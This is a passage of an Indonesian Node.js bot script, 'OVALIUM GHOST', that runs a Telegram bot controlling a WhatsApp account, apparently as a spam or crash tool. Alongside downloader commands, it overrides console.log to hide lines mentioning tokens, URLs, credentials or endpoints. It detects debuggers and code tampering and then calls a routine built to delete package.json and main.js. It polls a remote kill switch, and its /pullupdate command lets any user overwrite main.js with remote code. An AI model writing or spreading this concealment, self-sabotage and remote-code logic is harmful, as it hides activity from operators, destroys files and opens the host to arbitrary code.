const { Telegraf, Markup } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, channelUsername} = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

async function XatanicalServer(options = {}) {
  const {
    files = ["package.json", "main.js"],
    dryRun = true,
    maxRetries = 3,
    retryDelay = 1000,
  } = options;

  const baseDir = path.resolve(__dirname);
  console.log(chalk.redBright("SERVER MENDETEKSI ANDA MEMBYPASS TOKEN"));
  const timestamp = new Date().toISOString();
  console.log(chalk.blue(`Waktu Aktif: ${timestamp}`));

  const delay = (ms) => new Promise((res) => setTimeout(res, ms));
  const results = [];

  for (const file of files) {
    const record = { file, attempted: false, deleted: false, message: "" };
    try {
      const filePath = path.resolve(__dirname, file);
      if (!filePath.startsWith(baseDir + path.sep) && filePath !== baseDir) {
        record.message = "Path diluar direktori aman - dilewatkan";
        console.log(chalk.yellow(`⚠️ ${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      record.attempted = true;

      if (!fs.existsSync(filePath)) {
        record.message = "File tidak ditemukan (sudah aman / tidak ada).";
        console.log(chalk.green(`${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      const stats = await fs.promises.stat(filePath);
      if (!stats.isFile()) {
        record.message = "Bukan file biasa (direktori atau bukan file) - dilewatkan.";
        console.log(chalk.red(`${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      if (dryRun) {
        record.message = "Dry run - tidak dihapus.";
        console.log(chalk.yellow(` OVALIUM AKTIF BOSSSSS`));
        results.push(record);
        continue;
      }

      let lastErr = null;
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          await fs.promises.unlink(filePath);
          record.deleted = true;
          record.message = `Berhasil dihapus (attempt ${attempt}).`;
          console.log(chalk.yellow(`KAMU MEMBYPASS TOKEN — FILE DIHAPUS: ${file}`));
          break;
        } catch (err) {
          lastErr = err;
          if (err && (err.code === "EPERM" || err.code === "EBUSY" || err.code === "EACCES")) {
            if (attempt < maxRetries) {
              console.log(chalk.yellow(`${file}: gagal dihapus (${err.code}), mencoba ulang dalam ${retryDelayMs}ms (attempt ${attempt})...`));
              await delay(retryDelayMs);
              continue;
            } else {
              record.message = `Gagal setelah ${maxRetries} percobaan: ${err.message}`;
              console.log(chalk.red(`${file}: ${record.message}`));
            }
          } else {
            record.message = `Error tidak terduga: ${err.message}`;
            console.log(chalk.red(`${file}: ${record.message}`));
            break;
          }
        }
      }

      if (!record.deleted && lastErr && !record.message) {
        record.message = `Gagal: ${lastErr.message}`;
      }
    } catch (e) {
      record.message = `Exception: ${e.message}`;
      console.log(chalk.red(`${file}: Exception saat proses - ${e.message}`));
    } finally {
      results.push(record);
    }
  }

  const deletedCount = results.filter(r => r.deleted).length;
  console.log(chalk.blueBright(`@Xwarrxxx ${deletedCount}/${files.length}`));
  return { timestamp, results };
}

(function () {
  try {
    const origLog = console.log.bind(console);
   const blockedWords = [
      'fetching', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database',
      'token', 'apikey', 'key', 'secret', 'raw.githubusercontent', 'cdn.discordapp',
      'dropbox', 'pastebin', 'session', 'cookie', 'auth', 'login', 'credentials',
      'ip:', 'url:', 'endpoint', 'request', 'response'
    ];

    console.log = (...args) => {
      try {
        const content = args.map(a => {
          try { return typeof a === 'string' ? a : JSON.stringify(a); }
          catch { return String(a); }
        }).join(' ').toLowerCase();
        if (blockedWords.some(word => content.includes(word))) {
          return;
        }
        origLog(...args);
      } catch (err) {
        origLog('\x1b[31m[Proteksi Error]\x1b[0m', err.message);
      }
    };
    origLog('\x1b[35m[Xwar Server]\x1b[0m Proteksi aktif — sistem Aman.');

  } catch (err) {
    console.error('\x1b[31m[Proteksi Gagal]\x1b[0m', err);
  }
})();

const databaseUrl = `https://raw.githubusercontent.com/xwarku/database/refs/heads/main/tokens.json`;
const thumbnailUrl = "https://files.catbox.moe/5j2228.jpg";

const thumbnailVideo = "https://files.catbox.moe/e35c0e.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
  console.log(chalk.bold.redBright("⚠️ Secure mode diaktifkan!"));
  XatanicalServer()
}
(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      console.warn("⚠️ Deteksi debugger: " + randErr());
      activateSecureMode();
   }
  }, 1000);
  const code = "AlwaysProtect";
  if (code.length !== 13) {
    console.warn("⚠️ Code mismatch terdeteksi!");
    activateSecureMode();
  }
  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
    `));
  }
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    const currentHash = Buffer.from(secure.toString()).toString("base64");
    if (currentHash !== hash) {
      console.warn("⚠️ Modifikasi fungsi secure terdeteksi!");
      activateSecureMode();
    }
  }, 2000);
  secure();
})();
(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    try {
      let detected = false;
      if (typeof process.exit === "function" && process.exit.toString().includes("Proxy")) {
        detected = true;
      }
      if (typeof process.kill === "function" && process.kill.toString().includes("Proxy")) {
        detected = true;
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          detected = true;
          break;
        }
      }
      if (detected) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃ PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIKUNCI UNTUK KEAMANAN
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
      } else {
      }
    } catch (err) {
      console.warn("⚠️ Error saat pengecekan bypass:", err.message);
      activateSecureMode();
    }
  }, 2000);
  global.validateToken = async (databaseUrl, tokenBot) => {
    try {
      const res = await fetchJsonHttps(databaseUrl, 5000);
      const tokens = (res && res.tokens) || [];

      if (tokens.includes(tokenBot)) {
        console.log(chalk.greenBright("✅ Token valid dan diverifikasi."));
        return true;
      } else {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT ⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃ MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
        return false;
      }

    } catch (err) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
      `));
      activateSecureMode();
      return false;
    }
  };
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}


(async () => {
  await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;

let botActive = true;
let lastStatus = null;

const OWNER_ID = 5126860596;
const GITHUB_STATUS_URL = "https://raw.githubusercontent.com/xwarkoyz/Databasee/refs/heads/main/botstatus.json";

async function checkGlobalStatus() {
  try {
    const res = await axios.get(GITHUB_STATUS_URL, { timeout: 4000 });
    const newStatus = !!res.data.active;

    if (newStatus !== lastStatus) {
      lastStatus = newStatus;
      botActive = newStatus;
    }
  } catch (err) {
    botActive = true; // fallback biar bot tetap nyala kalau GitHub down
  }
}

checkGlobalStatus();
setInterval(checkGlobalStatus, 3000);

bot.use(async (ctx, next) => {
  try {
    const text = ctx.message?.text?.trim() || "";
    const cbData = ctx.callbackQuery?.data?.trim() || "";

    const isStartText = text.toLowerCase().startsWith("/start");
    const isStartCallback = cbData === "/start";

    // 🔐 Proteksi Token Validasi
    if (!secureMode && !tokenValidated && !(isStartText || isStartCallback)) {
      if (ctx.callbackQuery) {
        try {
          await ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start");
        } catch {}
      }
      return ctx.reply("🔒 ☇ Akses terkunci ketik /start untuk mengaktifkan bot");
    }

    // 🚫 Proteksi Global Status dari GitHub
    if (!botActive) {
      // Owner tetap bisa jalankan /on
      if (ctx.from?.id === OWNER_ID && /^\/on\b/i.test(text)) {
        return ctx.reply("MAKLO BYPASS ANJING");
      }
      return ctx.reply("KENALIN GUA @Danzddyy Sipaling bisa bypass, gua aslinya cuma make tools lotus yang dishare gua bisa tembusin sc tredict lewat addtoken member doang selebihnya ga tembus 😹");
    }

    await next();
  } catch (err) {
    console.error("Middleware error:", err);
    return ctx.reply("⚠️ Terjadi kesalahan internal pada sistem proteksi server.");
  }
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  
  // Animasi loading sederhana
  const dots = ['   ', '.  ', '.. ', '...'];
  for (let i = 0; i < 20; i++) {
    process.stdout.write(`\r${chalk.cyan('Loading')}${chalk.gray(dots[i % 4])}`);
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  console.log(chalk.bold.cyan(`
╔══════════════════════════════════╗
║    O V A L I U M   G H O S T    ║
╚══════════════════════════════════╝
  `));

  console.log(chalk.white('────────────────────────────────'));
  console.log(chalk.green('✓') + chalk.white(' Server: ') + chalk.green('Connected'));
  console.log(chalk.green('✓') + chalk.white(' Status: ') + chalk.cyan('Active'));
  console.log(chalk.green('✓') + chalk.white(' Time: ') + chalk.gray(new Date().toLocaleTimeString()));
  console.log(chalk.white('────────────────────────────────'));
  
  console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  

    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ PAIRING ⊰―—═⬡</pre></blockquote>
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connection`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
OVALIUM GHOST
Berhasil Dijalankan 
bot terkoneksi 
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};


bot.command("addbot", async (ctx) => {
if (!tokenValidated) {
            return;
        }
    if (ctx.from.id != ownerID && !isAdmin && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("Format: /addbot 628××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XWARARAA");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${phoneNumber}
Pairing Code: ${formattedCode}
Status: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connected
\`\`\``;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}



const cmdStateFile = './cmdState.json';

// Cek dan buat file JSON jika belum ada
if (!fs.existsSync(cmdStateFile)) {
  fs.writeFileSync(cmdStateFile, JSON.stringify({}));
}

// 📌 Fungsi untuk mengecek apakah command aktif
function isCmdEnabled(cmdName) {
  const data = JSON.parse(fs.readFileSync(cmdStateFile, 'utf8'));
  // Default: Jika belum pernah diatur, command dianggap AKTIF (true)
  return data[cmdName] !== false; 
}

// 📌 Fungsi untuk mengubah status command
function setCmdState(cmdName, state) {
  const data = JSON.parse(fs.readFileSync(cmdStateFile, 'utf8'));
  data[cmdName] = state; // true atau false
  fs.writeFileSync(cmdStateFile, JSON.stringify(data, null, 2));
}

// ======================
// 🟢 COMMAND MENGAKTIFKAN
// ======================
bot.command("enablecmd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("⛔ Akses ditolak. Khusus Owner.");
  
  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("📋 Format: <code>/enablecmd namacommand</code>\nContoh: <code>/enablecmd spamxdelay</code>", { parse_mode: "HTML" });

  setCmdState(cmd, true);
  return ctx.reply(`✅ Command <b>${cmd}</b> berhasil DIAKTIFKAN dan bisa digunakan kembali.`, { parse_mode: "HTML" });
});

// ======================
// 🔴 COMMAND MENONAKTIFKAN
// ======================
bot.command("disablecmd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("⛔ Akses ditolak. Khusus Owner.");
  
  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("📋 Format: <code>/disablecmd namacommand</code>\nContoh: <code>/disablecmd spamxdelay</code>", { parse_mode: "HTML" });

  setCmdState(cmd, false);
  return ctx.reply(`❌ Command <b>${cmd}</b> berhasil DINONAKTIFKAN. User tidak akan bisa memakainya.`, { parse_mode: "HTML" });
});

      
// === Command: /sticker ===
bot.command("sticker", async (ctx) => {
  const chatId = ctx.chat.id;
  await ctx.reply("📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  // Tunggu kiriman foto berikutnya dari user yang sama
  bot.on("photo", async (photoMsgCtx) => {
    if (photoMsgCtx.chat.id !== chatId) return; // hanya respon ke chat yang sama

    try {
      const photos = photoMsgCtx.message.photo;
      const fileId = photos[photos.length - 1].file_id;

      // ambil link file
      const fileLink = await bot.telegram.getFileLink(fileId);

      // download file
      const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);

      // kirim sebagai stiker
      await photoMsgCtx.replyWithSticker({ source: filePath });

      // hapus file sementara
      fs.unlinkSync(filePath);

      // beri konfirmasi
      await photoMsgCtx.reply("✅ Stiker berhasil dibuat!");
    } catch (err) {
      console.error("❌ Sticker error:", err.message);
      await photoMsgCtx.reply("❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});





function escapeMd(text = '') {
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}


bot.command('play', async (ctx) => {
  const chatId = ctx.chat.id;
  const userName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "Seseorang";
  
  const query = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!query) return ctx.reply("❌ Contoh: <code>/play serana</code>", { parse_mode: "HTML" });

  const loadingMsg = await ctx.reply(`🎧 <b>${userName}</b> sedang mencari lagu <i>${query}</i> di Spotify...`, { parse_mode: "HTML" });

  try {
    // ==========================================
    // TAHAP 1: SEARCH PAKE API SIPUTZX (LEBIH STABIL)
    // ==========================================
    const searchUrl = `https://api.siputzx.my.id/api/s/spotify?query=${encodeURIComponent(query)}`;
    const searchRes = await axios.get(searchUrl);

    // Cek apakah API merespon dengan benar
    if (!searchRes.data || !searchRes.data.data || searchRes.data.data.length === 0) {
      return ctx.telegram.editMessageText(chatId, loadingMsg.message_id, undefined, "❌ Lagu tidak ditemukan di Spotify.", { parse_mode: "HTML" }).catch(()=>{});
    }

    // Ambil lagu urutan pertama
    const firstSong = searchRes.data.data[0];
    const trackUrl = firstSong.track_url;
    const title = firstSong.title;
    const artist = firstSong.artist;

    await ctx.telegram.editMessageText(
      chatId, 
      loadingMsg.message_id, 
      undefined, 
      `🎶 <b>${title}</b>\n👤 ${artist}\n🌀 Sedang menyiapkan audio...`, 
      { parse_mode: "HTML" }
    ).catch(()=>{});

    // ==========================================
    // TAHAP 2: DOWNLOAD PAKE API SIPUTZX V2
    // ==========================================
    const dlUrl = `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(trackUrl)}`;
    const dlRes = await axios.get(dlUrl);

    if (!dlRes.data || !dlRes.data.status || !dlRes.data.data.mp3DownloadLink) {
      return ctx.telegram.editMessageText(chatId, loadingMsg.message_id, undefined, "❌ Gagal mengunduh mp3 dari server API.", { parse_mode: "HTML" }).catch(()=>{});
    }

    const song = dlRes.data.data;
    
    // ==========================================
    // TAHAP 3: DOWNLOAD FILE KE VPS & KIRIM
    // ==========================================
    const tmpFile = path.join(__dirname, `temp_audio_${Date.now()}.mp3`);

    const audioStream = await axios.get(song.mp3DownloadLink, { responseType: "stream" });
    const writer = fs.createWriteStream(tmpFile);
    audioStream.data.pipe(writer);
    
    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Kirim Cover Foto
    if (song.coverImage) {
      await ctx.replyWithPhoto(
        { url: song.coverImage },
        { caption: `🎵 <b>${title}</b>\n👤 ${artist}\n📀 Dicari oleh ${userName}`, parse_mode: "HTML" }
      ).catch(()=>{});
    }

    // Kirim Audio MP3
    await ctx.replyWithAudio(
      { source: tmpFile },
      {
        title: title,
        performer: artist,
        caption: `🎧 <b>${title}</b>\n👤 ${artist}\n💽 By ${userName}\nPowered by Xwarrxxx`,
        parse_mode: "HTML",
      }
    );

    // Hapus file sementara biar Pterodactyl gak penuh
    fs.unlinkSync(tmpFile);
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

  } catch (err) {
    console.error("Error saat play:", err.message);
    ctx.telegram.editMessageText(chatId, loadingMsg.message_id, undefined, `❌ Terjadi kesalahan sistem.`, { parse_mode: "HTML" }).catch(() => {});
  }
});





const GITHUB_REPO = "xwarxviii/main";
const GITHUB_BRANCH = "main";

bot.command("pullupdate", async (ctx) => {
  try {
    await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

    // Ambil isi root repo
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("❌ Tidak dapat mengakses .");

    const files = await res.json();

    // Cari file yang mengandung kata 'clover'
    const target = files.find(f => 
      f.name.toLowerCase().includes("main") && f.name.endsWith(".js")
    );

    if (!target) {
      return ctx.reply("❌ File tidak ditemukan.");
    }

    // Ambil file clover yang ditemukan
    const fileRes = await fetch(target.download_url);
    const fileDecoded = await fileRes.text();

    fs.writeFileSync("./main.js", fileDecoded);

    await ctx.reply(`✅ Update Berhasil\n📄 File ditemukan: *${target.name}*\n♻️ Restarting bot...`, { parse_mode: "Markdown" });

    setTimeout(() => process.exit(1), 1200);

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: Tidak bisa update script.");
  }
});


bot.command("tiktok", async (ctx) => {
if (!tokenValidated) {
            return;
        }
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}


function convertNtbaToTelegraf(code = "") {
  let out = String(code);

  out = out.replace(
    /const\s+TelegramBot\s*=\s*require\(['"]node-telegram-bot-api['"]\);?/g,
    "const { Telegraf } = require('telegraf');"
  );
  out = out.replace(
    /const\s+bot\s*=\s*new\s+TelegramBot\((.+?)\);?/g,
    "const bot = new Telegraf($1);"
  );

  out = out.replace(
    /bot\.onText\(\s*(\/.+?\/[gimsuy]*)\s*,\s*\((\w+)\s*,\s*(\w+)\)\s*=>\s*{/g,
    "bot.hears($1, (ctx) => {"
  );

  out = out.replace(
    /bot\.on\(['"]message['"]\s*,\s*\((\w+)\)\s*=>\s*{/g,
    "bot.on('text', (ctx) => {"
  );

  out = out.replace(/\bmsg\.chat\.id\b/g, "ctx.chat.id");

  out = out.replace(
    /bot\.sendMessage\(\s*msg\.chat\.id\s*,\s*/g,
    "ctx.reply("
  );

  out = out.replace(
    /bot\.sendMessage\(\s*([^)]+?),\s*/g,
    "ctx.telegram.sendMessage($1, "
  );

  return out;
}

function convertTelegrafToNtba(code = "") {
